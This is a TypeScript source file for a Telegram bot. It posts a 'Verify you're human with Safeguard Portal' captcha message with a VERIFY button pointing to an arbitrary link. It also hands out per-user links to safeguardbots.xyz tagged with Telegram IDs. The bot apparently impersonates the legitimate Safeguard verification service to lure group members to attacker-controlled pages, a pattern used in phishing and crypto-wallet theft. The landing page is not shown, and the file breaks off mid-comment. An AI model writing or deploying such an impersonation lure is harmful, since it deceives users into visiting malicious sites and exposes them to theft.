// add dotenv

import TelegramBot from "node-telegram-bot-api";

require("dotenv").config();

const { BOT_TOKEN } = process.env;
if (!BOT_TOKEN) {
  throw new Error("BOT_TOKEN not found in environment variables");
}

const bottoken = BOT_TOKEN;

let bot: TelegramBot;

bot = new TelegramBot(bottoken, {
  polling: true,
});

const mainLink = "https://t.me/MagicStringNotBot/SafeGuard";

bot.on("channel_post", async (message: TelegramBot.Message) => {
  //   console.log("channel_post: ", message);
  const chatId = message.chat.id;
  if (message.text?.includes("verify")) {
    //here will send the bullX message

    const link = message.text?.split("-")[1];
    console.log("userId: ", link);

    await bot.sendPhoto(
      chatId,
      "https://res.cloudinary.com/dwrgekpsz/image/upload/v1737610256/safe.jpg",
      {
        caption: `Verify you're human with Safeguard Portal\n\nClick 'VERIFY' and complete captcha to gain entry - [Not Working?](https://docs.safeguard.run/group-security/verification-issues)`,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "VERIFY", url: link }]],
        },
      }
    );
  }
});

bot.onText(/\/getId/, async (msg) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from?.id!;
  await bot.sendMessage(chatId, `${telegramId}`);
});

bot.onText(/\/getLink/, async (msg) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from?.id!;
  const spo = "https://safeguardbots.xyz";
  const link = `${spo}?ail=${telegramId}`;
  await bot.sendMessage(chatId, `${link}`);
});

//now we will sen
